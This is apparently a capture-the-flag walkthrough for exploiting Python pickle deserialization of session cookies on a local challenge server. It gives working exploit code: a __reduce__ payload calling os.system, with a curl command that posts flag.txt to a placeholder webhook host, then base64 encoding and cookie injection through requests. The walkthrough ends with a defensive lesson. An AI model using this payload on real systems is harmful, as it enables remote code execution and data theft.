1. **Understand the vulnerability**: This challenge uses Python's `pickle` module to deserialize session cookies. Pickle deserialization is dangerous because it can execute arbitrary code when deserializing malicious objects.

2. **Create a malicious pickle object**: Create a Python class that uses the `__reduce__` method to execute a command when unpickled. The `__reduce__` method should return a tuple containing a callable (like `os.system`) and its arguments.

   ```python
   import pickle
   import base64
   import os

   class RCE:
       def __reduce__(self):
           # Command to exfiltrate the flag
           cmd = 'curl -X POST --data-binary @flag.txt https://your-webhook-url'
           return (os.system, (cmd,))
   ```

3. **Craft the payload**: The payload should execute a command that exfiltrates the flag. You can use `curl` to send the flag to a webhook service like webhook.site, or use other methods to retrieve the flag.

4. **Serialize and encode**: Use `pickle.dumps()` to serialize your malicious object, then base64 encode it to make it suitable for use as a cookie value.

   ```python
   # Serialize the malicious object
   pickled = pickle.dumps(RCE())

   # Base64 encode for use as a cookie
   encoded_pickle = base64.b64encode(pickled).decode('utf-8')
   ```

5. **Set the malicious cookie**: Replace the `session` cookie with your base64-encoded malicious pickle object. You can do this programmatically using requests or manually through browser developer tools.

   ```python
   import requests

   cookies = {'session': encoded_pickle}
   response = requests.get('http://localhost:5004', cookies=cookies)
   ```

6. **Trigger the deserialization**: Make a request to the server. When the server tries to deserialize your malicious session cookie, it will execute your payload.

7. **Retrieve the flag**: Check your webhook or wherever you sent the flag data to retrieve the flag.

**Key concept**: Never trust user input, especially when using dangerous deserialization methods like pickle. Always validate and sanitize data, and consider using safer alternatives like JSON for session data.
